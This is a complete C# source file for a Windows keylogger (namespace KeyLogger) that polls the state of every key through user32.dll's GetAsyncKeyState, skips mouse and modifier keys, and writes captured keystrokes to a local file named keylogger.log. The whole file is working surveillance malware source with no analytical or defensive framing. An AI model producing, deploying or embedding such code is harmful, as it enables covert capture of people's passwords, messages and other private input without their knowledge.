using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace KeyLogger
{
    static class Program
    {
        [STAThread]
        static void Main(String[] args) => StartLogging();

        static void StartLogging()
        {
            var buf = String.Empty;
            while (true)
            {
                Thread.Sleep(100);
                for (int i = 0; i < 255; i++)
                {
                    int state = GetAsyncKeyState(i); // by key number returns the current state
                    if (state != 0) // pressed key
                    {
                        #region input validation
                        // ignore
                        if (i == 0) continue; // idle
                        if (((Keys)i) == Keys.LButton ||
                            ((Keys)i) == Keys.RButton ||
                            ((Keys)i) == Keys.MButton ||
                            ((Keys)i).ToString() == "LMenu" ||
                            ((Keys)i).ToString() == "RMenu" ||
                            ((Keys)i).ToString() == "LShiftKey" ||
                            ((Keys)i).ToString() == "RShiftKey" ||
                            ((Keys)i).ToString() == "LControlKey" ||
                            ((Keys)i).ToString() == "RControlKey") continue;

                        // replace
                        if (((Keys)i) == Keys.Space) { buf += " "; continue; }
                        if (((Keys)i) == Keys.Enter) { buf += "\r\n"; continue; }

                        // register
                        buf +=
                            ((Keys)i).ToString().Length == 1 ?
                            ((Keys)i).ToString() : $"<{((Keys)i).ToString()}>";
                        #endregion

                        // logging
                        if (buf.Length > 5) // minimize disk operations
                        {
                            File.AppendAllText("keylogger.log", buf);
                            buf = "";
                        }
                    }
                }
            }
        }

        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
    }
}
